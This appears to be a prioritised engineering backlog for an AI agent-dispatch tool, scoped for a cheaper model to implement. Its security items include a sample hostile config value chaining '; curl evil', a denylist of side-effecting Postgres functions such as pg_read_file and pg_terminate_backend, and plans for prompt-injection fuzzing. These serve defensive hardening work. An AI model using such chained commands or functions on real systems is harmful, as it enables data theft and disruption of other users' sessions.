# VXD Weaknesses & Cheap-Model Fix Plan

> **Purpose.** This document is the delegable backlog for a **cheaper model**
> (Haiku/Gemma/gpt-5.5 tier) working on Vortex Dispatch. Every item is scoped so
> it can be picked up without re-planning: what's wrong, why it matters, the exact
> files, the acceptance criteria, and the test hook. Priorities are **P0/P1/P2**
> — P0 = correctness / security / paying-customer blockers, P1 = maturity gaps
> that show up in real usage, P2 = polish.
>
> Compiled 2026-07-12 from CLAUDE.md, AGENTS.md, `docs/audit-findings-2026-07-05.md`,
> and a fresh multi-agent recon of `internal/`. Every finding cross-references code,
> so nothing is speculative.
>
> **How to use this file.** Assign one item at a time. Each item's *Acceptance*
> block is the definition of done — treat it as a wiring test spec. Do NOT re-scope
> without a note back to the tech-lead. Ship one PR per item unless two are truly
> coupled.

---

## Legend

| Field | Meaning |
|---|---|
| **P0** | Correctness bug, security hole, or paying-customer blocker. Ship this week. |
| **P1** | Maturity gap that hurts real usage. Ship this month. |
| **P2** | Polish, ergonomics, small cleanups. Batch as capacity allows. |
| **Effort** | S = <½ day, M = 1-2 days, L = 3-5 days |
| **Files** | Where to start. Not exhaustive — grep for callers. |
| **Acceptance** | Test names + observable behavior that pin the fix in CI. |
| **Non-goals** | What NOT to touch while fixing this item (scope discipline). |

---

## Table of Contents

- [P0 — Correctness / Security / Blockers](#p0--correctness--security--blockers)
- [P1 — Maturity gaps (real-usage friction)](#p1--maturity-gaps-real-usage-friction)
- [P2 — Polish and ergonomics](#p2--polish-and-ergonomics)
- [Cross-cutting workstreams](#cross-cutting-workstreams)
- [Delivery order for a solo cheap-model runner](#delivery-order-for-a-solo-cheap-model-runner)

---

## P0 — Correctness / Security / Blockers

### P0-01 — Self-improve pipeline produces 0 actionable findings (retained as scaffolding)

- **Symptom.** `internal/improve/` scrapes 14 sources daily, triages 70+ findings, but every finding classifies as ecosystem news, not code-actionable. The `Implementer` phase has never fired. Email delivery has never succeeded (Resend 403). Documented as "experimental / retained as scaffolding" in `CLAUDE.md` — but still ships in the binary and consumes daily runtime.
- **Why it matters.** A visible feature that has never worked degrades trust with paying customers. Either fix it or gate it behind an explicit opt-in flag so nobody thinks it's a shipping capability.
- **Files.**
  - `internal/improve/research.go:200+` (source scrapers)
  - `internal/improve/analyzer.go:20+` (actionable classifier)
  - `internal/improve/implementer.go:40+` (never-fired)
  - `internal/improve/weekly.go` (Resend delivery)
  - `internal/cli/improve.go`
- **Fix plan (choose ONE):**
  - **Option A (recommended).** Add `improve.enabled` config (default `false`). Skip the cron unless true. Update README + CLAUDE.md to state clearly it's experimental. `cmd/vxd-improve` behind a build tag.
  - **Option B.** Rewrite the source list to scrape *codebase* signals (staticcheck outputs of recent releases, changelogs of direct deps, CVE feeds for our module graph) — not blog posts. Add a "codebase-actionable" scorer that requires: (a) matches a symbol/file in this repo, (b) has a suggested code change, (c) has a citation URL.
- **Acceptance.**
  - `TestImproveDefaultDisabled` — `DefaultConfig().Improve.Enabled == false`.
  - `TestImproveCronNoOpWhenDisabled` — daily run is a no-op with `improve.enabled=false`.
  - README + CLAUDE.md self-improve section flagged **experimental** in bold.
  - `vxd-improve` binary prints `improvement pipeline disabled; set improve.enabled=true in vxd.yaml to opt in` and exits 0 by default.
- **Non-goals.** Do NOT ship option B in the same PR as option A. Do NOT delete `internal/improve/` — the code is research scaffolding.
- **Effort.** S (option A) / L (option B).

### P0-02 — `qa` role bound to LLM providers is inert

- **Symptom.** `models.qa: {provider: codex, model: gpt-5.5}` is silently ignored — QA runs lint/build/test (`qa.go`) not an LLM. CLAUDE.md notes this as a caveat, but the config still accepts the binding without warning.
- **Why it matters.** Operators set `models.qa` expecting a review pass, get none. Cost estimates look wrong.
- **Files.**
  - `internal/config/config.go` (validation)
  - `internal/cli/preflight.go` (add check)
  - `internal/preflight/checks.go` (new `CheckQAModelInert`)
- **Fix plan.**
  - In `config.Validate()`, if `models.qa` is set to any provider, emit a WARNING (not an error) that QA is command-based.
  - Add preflight check `CheckQAModelInert` — WARNING tier — surfaces the same message with a doc link.
- **Acceptance.**
  - `TestConfigValidate_QAModelInertWarning` in `internal/config/`.
  - `TestPreflight_QAModelInertCheck` in `internal/preflight/`.
  - `AllChecks` count in preflight bumps by 1; pinned test updated.
- **Effort.** S.

### P0-03 — YAML pipe/semicolon caveat is documented but unenforced at boundary

- **Symptom.** `ValidateConfigShellCommand` blocks command substitution (backticks, `$(...)`) but allows `|`, `;`, `&&`. Trusted-operator model per CLAUDE.md — but a copy-pasted `vxd.yaml` from a hostile source can still chain `; curl evil`.
- **Why it matters.** For paying customers running SaaS-hosted VXD, "operator trust boundary" is a real attack path.
- **Files.**
  - `internal/config/validate.go`
  - `internal/config/config.go` (new field)
- **Fix plan.**
  - Add config field `security.strict_shell_commands` (default `false` for backward compat).
  - When true, `ValidateConfigShellCommand` also rejects `|`, `;`, `&&`, `||`, `>`, `<`, `>>`, `2>&1`. Provide `command_list:` array alternative so operators can still express multi-step: `["go build", "go test ./..."]` — VXD chains them, YAML doesn't.
  - Document the boundary in README + CLAUDE.md, with a note that SaaS deploys should set strict mode.
- **Acceptance.**
  - `TestValidateShellCommand_StrictMode` — 12 cases (pipe, semi, `&&`, redirection, all combinations).
  - `TestConfigLoad_CommandListAsAlternative` — `command_list: [a, b]` parses and runs sequentially.
- **Non-goals.** Don't break existing operators. Default MUST stay `false`; opt-in only.
- **Effort.** M.

### P0-04 — Dashboard bearer token is static per install; no rotation, no per-user identity

- **Symptom.** `~/.vxd/dashboard.token` is a single 32-byte hex string. Any leak = full dashboard control until manual delete. No per-user, no expiry, no audit trail.
- **Why it matters.** Multi-user (team) usage is impossible; leaked token = full attacker access.
- **Files.**
  - `internal/web/auth.go`
  - `internal/cli/dashboard.go`
- **Fix plan.**
  - Add `dashboard.token_ttl_hours` (default `168` = 7 days).
  - On startup, if token file is older than TTL → rotate: generate new, write, log rotation event.
  - Add `vxd dashboard rotate-token` CLI command for manual rotation.
  - Add optional `dashboard.token_ttl_on_use` (default false) — sliding window rotation on every valid request.
- **Acceptance.**
  - `TestAuth_TokenRotatesAfterTTL` — token file mtime > TTL → new token minted.
  - `TestDashboardRotateTokenCmd` — command replaces token, prints new one.
  - Rotation event in event log: `DASHBOARD_TOKEN_ROTATED`.
- **Effort.** M.

### P0-05 — `vxd db sql` static classifier has documented function-call bypass

- **Symptom.** `sqlsafety.ClassifyQuery` allows read-only leading keywords but does NOT block side-effecting functions (`SELECT pg_terminate_backend(...)`, `SELECT lo_import(...)`). CLAUDE.md documents this as a known gap.
- **Why it matters.** On multi-tenant devdb, any local user can kill sessions of another user's DB via `psql` through `vxd db sql --write=false`.
- **Files.**
  - `internal/sqlsafety/sql_safety.go`
  - `internal/cli/db.go`
- **Fix plan.**
  - Build a denylist of side-effecting functions: `pg_terminate_backend`, `pg_cancel_backend`, `lo_import`, `lo_export`, `pg_read_file`, `pg_ls_dir`, `pg_reload_conf`, `pg_stat_file`. Regex-match on the stripped-of-comments-and-strings query.
  - Reject any hit in read-only mode with a clear error.
  - Add a config knob `devdb.allowed_functions_denylist_extra: [...]` for operators to append.
- **Acceptance.**
  - `TestSQLSafety_FunctionDenylist` — 8 cases (each function, case-insensitive, whitespace-invariant, embedded in `pg_termin` bypass attempts).
  - `TestSQLSafety_DenylistExtraConfig` — extra functions denied.
- **Effort.** S.

### P0-06 — No formal budget cap per requirement (paying-customer runaway risk)

- **Symptom.** `vxd estimate` gives a quote but nothing enforces it. A tier-3 replan cascade on a stubborn requirement can consume 10× the estimate.
- **Why it matters.** Paying customers require predictable spend. Silent budget-blow-through kills contracts.
- **Files.**
  - `internal/state/models.go` (add `BudgetUSD *float64` to Requirement)
  - `internal/engine/monitor_polling.go` (add budget check)
  - `internal/cli/req.go` (accept `--budget-usd`)
- **Fix plan.**
  - Add `Requirement.BudgetUSD` (optional).
  - New event `REQ_BUDGET_EXCEEDED` — pauses requirement (does NOT escalate) with `resume` hint that raises budget.
  - Poll periodic cost estimate via `AgentScores` × tokens; when running total ≥ budget × 0.9, emit warning; ≥ budget, emit `REQ_BUDGET_EXCEEDED`.
  - CLI: `vxd req "..." --budget-usd 25` and `vxd resume <id> --raise-budget 50`.
- **Acceptance.**
  - `TestBudgetCap_WarnsAt90Percent`.
  - `TestBudgetCap_PausesAtOverrun`.
  - `TestBudgetCap_RaiseBudgetResumes`.
  - Event `REQ_BUDGET_EXCEEDED` in projection switch (add to exhaustiveness test).
- **Non-goals.** Don't try to interrupt an in-flight LLM call; check between story boundaries.
- **Effort.** L.

### P0-07 — Prompt-file 0600 fix doesn't cover `.vxd-design/`

- **Symptom.** `stripVXDArtifactsFromBranch` removes `.vxd-design/` from branches but the working-tree copy in `<repo>/.vxd-design/` is 0644 by default. Figma design context contains node IDs + token metadata that maps back to internal design files.
- **Why it matters.** On shared dispatch hosts, non-owner users can read design refs.
- **Files.**
  - `internal/figma/context.go` (`BuildDesignContext`)
- **Fix plan.**
  - When creating the `.vxd-design/` directory + files, use `0o700` / `0o600`.
- **Acceptance.**
  - `TestFigmaBuildContext_FilePermsOwnerOnly` — every file under `.vxd-design/` is `0o600`, dir is `0o700`.
- **Effort.** S.

---

## P1 — Maturity gaps (real-usage friction)

### P1-01 — `internal/cli` coverage stuck at 72.9% (target 80%)

- **Symptom.** CLAUDE.md "Still open". Structural: cobra RunE functions read globals (CWD, HOME), require Docker/gh/claude CLI fakes.
- **Fix plan.**
  - Introduce package-level fakes: `internal/cli/testing/fakedocker`, `fakegh`, `fakeclaude`. Wire via existing `dbProviderFor` / `newDevDBProvider` seams.
  - Cover: `vxd db connect`, `vxd db template create`, `vxd security scan`, `vxd figma auth` happy path.
- **Acceptance.**
  - `go test -covermode=atomic ./internal/cli/...` reports ≥ 80.0%.
- **Effort.** L.

### P1-02 — No first-class debugger agent (relies on prompt playbooks)

- **Symptom.** `internal/agent/diagnostics.go` ships `BugHuntingMethodology`, `LegacyCodeSurvival`, `InfrastructureDebugging` — but they're prompt text, not agents. When a story fails at review + QA, there is no "run a debugger" step; the same-role retry gets the same prompt.
- **Fix plan.**
  - Add role `debugger`, model `claude-opus-4-8` (or configured).
  - New escalation option: on QA fail after tier-0 retry, dispatch a debugger agent with (a) the failing test output, (b) the diff, (c) the reproduce command, and require an explicit hypothesis-then-fix cycle.
  - Wire before the manager tier as an optional intermediate (config: `escalation.debugger_before_manager: true`).
- **Acceptance.**
  - `TestDispatcher_RoutesDebuggerOnQAFailure`.
  - `TestEscalation_DebuggerBeforeManager`.
  - `TestPrompts_DebuggerHypothesisFirst`.
- **Effort.** L.

### P1-03 — Repo Learning is one-shot (no incremental delta)

- **Symptom.** `internal/repolearn/scanner.go` runs 3 passes on demand (`vxd learn`), stores profile, and never updates unless re-run. New files never enter the profile until manual re-scan.
- **Fix plan.**
  - Add `learn.watch` mode: `vxd learn --watch` runs pass 1 on every commit hook + pass 3 on `.git/objects` growth threshold.
  - Store profile version + last-updated commit hash. `vxd learn --incremental` diffs commits since last hash and reruns only affected passes.
- **Acceptance.**
  - `TestRepoLearn_IncrementalAfterCommit`.
  - `TestRepoLearn_ProfileVersionBumps`.
- **Effort.** M.

### P1-04 — LLM client has no local-model provider (Ollama, LM Studio)

- **Symptom.** Only Anthropic (HTTP + CLI), Google AI HTTP, OpenAI HTTP, Codex CLI. NXD has Ollama but rule says "NEVER reference VXD in NXD code" — so no cross-borrow. Paying customer on-prem deploys need local inference.
- **Fix plan.**
  - Add `internal/llm/ollama.go` — OpenAI-compatible v1 API against `OLLAMA_HOST` (default `http://localhost:11434`).
  - Register provider `ollama` in factory. Support common models: `llama-3.3-70b`, `qwen-3-72b`, `deepseek-r1`.
  - Reuse `CompletionRequest` — no new type.
- **Acceptance.**
  - `TestOllamaClient_CompleteRoundtrip` with `httptest.Server`.
  - `TestFactory_RoutesOllamaProvider`.
  - Preflight `CheckOllama` — INFO tier if config uses it and it's unreachable.
- **Non-goals.** Do not port NXD verbatim; write fresh.
- **Effort.** M.

### P1-05 — No OpenTelemetry traces (observability blind)

- **Symptom.** Event log is rich but there's no distributed tracing. A story's LLM calls, tool invocations, and worktree ops are not correlated. Debugging a slow requirement requires reading `events.jsonl` by hand.
- **Fix plan.**
  - Add `go.opentelemetry.io/otel` dep.
  - Wrap every LLM `Complete()` call with a span (attributes: model, provider, prompt-tokens, output-tokens, latency).
  - Wrap every `Runtime.Spawn/Terminate/SendInput` with a span.
  - Wrap every `git.CreateWorktree/DeleteWorktree` with a span.
  - Trace ID = requirement ID; span ID = story ID. Exporter default OTLP to `localhost:4318`; disabled by default via env `VXD_OTEL_DISABLE=1`.
- **Acceptance.**
  - `TestOTelTracing_LLMCallEmitsSpan` — using in-mem exporter, verify attributes.
  - `TestOTelTracing_DisabledByEnv`.
- **Effort.** L.

### P1-06 — No structured plugin API (third-party runtimes / roles)

- **Symptom.** Adding a new LLM provider or role means editing internal code. No plugin loader.
- **Fix plan.**
  - Define `internal/plugin/plugin.go` interface: `Runtime`, `LLMClient`, `Scanner`, `Notifier` extension points.
  - Use `hashicorp/go-plugin` for gRPC-over-Unix-socket plugins so plugins can be language-agnostic.
  - Bundle: `plugin add <path>`, `plugin list`, `plugin remove <name>`. Store in `~/.vxd/plugins/`.
  - Signed plugins (Sigstore) — plugin registry entry has `sig_url` + `pubkey_id`.
- **Acceptance.**
  - `TestPlugin_LoadHelloWorld` (in-repo test plugin).
  - `TestPlugin_UnsignedRejected`.
  - `docs/plugin-authoring.md` written.
- **Effort.** L.

### P1-07 — DevDB is Postgres-only (no MySQL, Redis, MongoDB)

- **Symptom.** `internal/devdb/docker/pg.go` is the only backend. Stories touching MySQL apps can't get ephemeral test DBs.
- **Fix plan.**
  - Extract `internal/devdb/docker/common.go` — container lifecycle + host/port allocator.
  - Add `mysql/`, `redis/`, `mongo/` variants — each implements `Provider` interface.
  - Config: `devdb.driver: postgres|mysql|redis|mongo`; template migration format per driver.
- **Acceptance.**
  - `TestMySQLProvider_CreateAndDrop`.
  - `TestRedisProvider_CreateAndDrop`.
  - `TestMongoProvider_CreateAndDrop`.
- **Effort.** L.

### P1-08 — No red-team fuzzer for prompt injection (defense untested)

- **Symptom.** 56 injection patterns in `sanitize.go` — but no ongoing corpus. New attack families (indirect via git commit messages, dependency READMEs) aren't tested.
- **Fix plan.**
  - Add `internal/sanitize/fuzz/` — Go fuzz targets over `DetectPromptInjection` and `MatchInjectionPattern`.
  - Corpus seeded from OWASP LLM01, garak, promptmap.
  - CI job runs 60s fuzz per push (`-fuzztime=60s`) — new corpus additions saved.
- **Acceptance.**
  - `TestSanitizeFuzz_KnownAttacksAllCaught` (regression suite of 200+ known attacks).
  - `.github/workflows/fuzz.yml` job green.
- **Effort.** M.

### P1-09 — Windows native lacks tmux (WSL-only agent pipeline)

- **Symptom.** README documents this. `estimate/status/metrics/report` work; `req/resume` require WSL2.
- **Fix plan.**
  - Add `internal/runtime/winexec_runner.go` — uses Windows Job Objects for process supervision. Not tmux-equivalent (no attach), but survives monitor restart via named pipe reconnection.
  - Preflight downgrades `tmux_server` CRITICAL → WARNING when `runtime.backend: winexec`.
- **Acceptance.**
  - `TestWinExecRunner_SpawnSurvivesReconnect` (skipped on non-Windows CI, ran on Windows CI matrix).
  - GOOS=windows CI green.
- **Non-goals.** Don't chase feature parity with tmux (no live attach) — MVP is spawn / terminate / read output.
- **Effort.** L.

### P1-10 — Dashboard has no metrics dashboarding (no Prometheus/Grafana)

- **Symptom.** `vxd metrics` prints text tables. No time-series export.
- **Fix plan.**
  - Serve `/metrics` on the web dashboard with Prometheus format (histograms: story duration by tier, LLM latency by provider; counters: escalations by tier, security findings by severity).
  - Ship a Grafana dashboard JSON in `docs/grafana/vxd.json`.
- **Acceptance.**
  - `TestMetricsEndpoint_PrometheusFormat`.
  - Grafana JSON validates against Grafana 10.4 schema.
- **Effort.** M.

### P1-11 — Backup uses `tar.gz` only (no incremental, no cloud)

- **Symptom.** `vxd backup` snapshots the state dir into a local `.tar.gz`. No S3/GCS/Azure Blob, no incremental, no rotation policy.
- **Fix plan.**
  - Add `--to s3://bucket/prefix/` support via `github.com/aws/aws-sdk-go-v2`.
  - Rotation: keep-last-N with `--retain 7`.
  - Optional incremental via file-hash manifest (skip unchanged files).
- **Acceptance.**
  - `TestBackup_S3Roundtrip` with `minio` httptest server.
  - `TestBackup_Retention`.
- **Effort.** M.

### P1-12 — No formal SLA/latency budget per role

- **Symptom.** `sla.max_minutes_per_complexity` covers the whole story. Individual role latency (tech-lead planning, senior review) not budgeted.
- **Fix plan.**
  - Extend config: `sla.max_seconds_per_role: {tech_lead: 300, senior: 900, ...}`.
  - Emit `ROLE_SLA_BREACHED` event when exceeded; escalate to fallback model.
- **Acceptance.**
  - `TestRoleSLA_TechLeadTimeoutEscalates`.
- **Effort.** S.

### P1-13 — Notify has no PagerDuty / email / SMTP

- **Symptom.** Slack + generic webhook only.
- **Fix plan.**
  - Add `notify.pagerduty.integration_key`, `notify.email.smtp_url` providers.
  - Route by event severity: `PIPELINE_STALLED` + `REQ_BLOCKED` → PagerDuty; `REQ_COMPLETED` → email.
- **Acceptance.**
  - `TestPagerDutyNotifier_EmitsIncident`.
  - `TestSMTPNotifier_Delivers`.
- **Effort.** M.

### P1-14 — No dynamic model swap mid-run based on availability

- **Symptom.** `CodexWithFallback` static: codex → claude-opus-4-7. On a run where Claude is also 429, no further fallback.
- **Fix plan.**
  - Add `models.<role>.fallback_chain: [{...}, {...}]` config.
  - On any capacity error, walk the chain; emit `MODEL_FALLED_BACK` event.
- **Acceptance.**
  - `TestFallbackChain_WalksMultipleProviders`.
- **Effort.** M.

---

## P2 — Polish and ergonomics

### P2-01 — `vxd status` and `vxd watch` don't share code

- Files: `internal/cli/status.go`, `internal/cli/watch.go`. Extract snapshot format into `internal/state/format.go`. **S.**

### P2-02 — Preflight check counts pinned in 3 files

- `TestAudit_PreflightCheckCounts`, `TestAllChecks_Count`, `TestDispatchChecks_Count`. Move to one canonical source. **S.**

### P2-03 — `vxd events` has no time-range filter

- Add `--since 24h`, `--until <ts>`. **S.**

### P2-04 — TUI dashboard has no keyboard shortcut for "jump to requirement"

- Bubbletea keymap missing. **S.**

### P2-05 — No `vxd doctor` catch-all diagnostic command

- Bundles preflight + config validate + last-error summary. **S.**

### P2-06 — Autoresearch bandit rewards only build/coverage/lint metrics

- Add benchmark metric (`go test -bench` deltas) as fourth axis. `internal/autoresearch/metric.go`. **M.**

### P2-07 — Security KB has no export

- `vxd security kb --export markdown` for review. **S.**

### P2-08 — `vxd report --html` doesn't embed SVG diagrams

- HTML template escapes them; use `template.HTML` for the diagram blocks. **S.**

### P2-09 — Frontend design brief has no A11y validator agent

- Add axe-core headless run as post-QA check when `IsFrontend`. **M.**

### P2-10 — Autoresearch coordinator doesn't emit per-experiment cost

- Add `EXPERIMENT_COST` event with tokens + USD. **S.**

### P2-11 — Memory dashboard has no export

- Add `vxd memory export --format json`. **S.**

### P2-12 — No CLI global `--json` for machine consumption

- Most commands support `--json`, but not all. Table pinned per command. **S.**

### P2-13 — README has no "roadmap" section

- Add explicit near/mid/long roadmap section. **S.**

### P2-14 — GitHub Actions billing failure (CI slimmed to ubuntu-only)

- Marked in CLAUDE.md pending work. Fix billing OR add self-hosted runner. **Ops.**

### P2-15 — No `vxd shell` REPL for exploratory queries

- Interactive prompt over event store + projections. **M.**

---

## Cross-cutting workstreams

These are big changes that span multiple items above. Cheap-model runner should keep them in mind but should NOT bundle into a single PR — decompose per feature.

- **Multi-tenancy.** No per-user identity anywhere. Everything assumes single-operator.
  Feeds: **P0-04** (dashboard tokens), **P1-06** (plugin RBAC), **P2-05** (per-user diagnostic).
- **Cost accounting.** Estimate is a quote; running total not tracked; budget not enforced.
  Feeds: **P0-06** (budget cap), **P2-10** (experiment cost).
- **Observability.** Event log is rich, distributed tracing absent.
  Feeds: **P1-05** (OTEL), **P1-10** (Prometheus), **P2-05** (doctor command).
- **Provider portability.** Anthropic-heavy; needs Ollama, Groq, Cerebras for on-prem / cost tiers.
  Feeds: **P1-04** (Ollama), **P1-14** (fallback chain).

---

## Delivery order for a solo cheap-model runner

Optimized for value-per-day. Green each PR before starting the next.

1. **Week 1 (correctness first):**
   - P0-05 (SQL function denylist) — S
   - P0-07 (design-file perms) — S
   - P0-02 (QA-model-inert warning) — S
   - P0-01 option A (gate improve pipeline) — S
2. **Week 2 (safety envelope):**
   - P0-03 (strict shell mode) — M
   - P0-04 (dashboard token rotation) — M
3. **Week 3-4 (budget + coverage):**
   - P0-06 (budget cap) — L
   - P1-01 (CLI coverage → 80%) — L (can interleave)
4. **Week 5-6 (observability + platform):**
   - P1-05 (OTEL) — L
   - P1-10 (Prometheus) — M
   - P1-12 (per-role SLA) — S
5. **Week 7-8 (models + escalation):**
   - P1-04 (Ollama) — M
   - P1-14 (fallback chain) — M
   - P1-02 (debugger agent) — L
6. **Week 9+ (extensions):**
   - P1-06 (plugin API) — L
   - P1-07 (multi-DB devdb) — L
   - P1-09 (Windows winexec) — L
   - P1-08 (fuzzer) — M
   - P1-11 (S3 backup) — M
   - P1-13 (PagerDuty/SMTP) — M
   - P1-03 (incremental repolearn) — M
7. **P2 backlog** — pick 1-2 per week as capacity allows.

Total effort: **~10-14 solo weeks** for a well-scoped Haiku/Gemma runner working full-time.
Each PR MUST update `CLAUDE.md` + `README.md` per the doc-coverage tests.
